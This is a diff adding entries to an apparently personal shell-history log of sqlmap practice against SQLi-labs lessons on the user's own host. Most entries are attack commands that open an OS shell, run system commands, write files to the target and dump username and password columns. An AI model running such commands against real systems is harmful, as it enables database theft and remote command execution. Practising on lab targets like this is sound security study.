@@ -160,6 +160,30 @@
   161  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --file-write="/home/xiaoxiaoran/xiao/python/xiao.py" --file-dest="D:\\1.py"
   162  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -a
 
+  164  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --os-shell
+  165  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -s session.sqlite
+  166  tree home/xiaoxiaoran/.local/share/sqlmap/output/
+  167  tree home/xiaoxiaoran/.local/share/sqlmap
+  168  tree /home/xiaoxiaoran/.local/share
+  169  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com
+  170  cat /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/session.sqlite
+  171  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -t /home/xiaoxiaoran/xiao/task1_sqlmap.txt --flush-session -v3 --batch
+  172  vim /home/xiaoxiaoran/xiao/task1_sqlmap.txt
+  173  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --os-cmd="ipconfig" -v3
+  174  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch --crawl=3
+  176  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch --csv-del=";" -v3 -D sercurity -T users -C "username,password" --dump --theads 10
+  177  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch --csv-del=";" -v3 -D sercurity -T users -C "username,password" --dump --threads 10
+  178  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch -D sercurity -T users -C "username,password" --dump --threads 10
+  179  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch --csv-del=";" -v3 -D xiaoxiaoran -T xiao -C "username,password" --dump --threads 10
+  180  vim /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com/dump/xiaoxiaoran/xiao.csv               
+  181  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch  -v3 -D xiaoxiaoran -T xiao -C "username,password" --dump-format="html" --threads 10 
+  182  tree /home/xiaoxiaoran/.local/share/sqlmap/output/xiaoxiaoran.com
+  183  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --batch  -v3 -D xiaoxiaoran -T xiao -C "username,password" --dump-format="html" --threads 10 
+  184  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --check-internrt -v3
+  185  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" --check-internet -v3
+  186  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-1/?id=1" -dbs
+  187  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-11/index.php" --form
+
 	
 	
 	
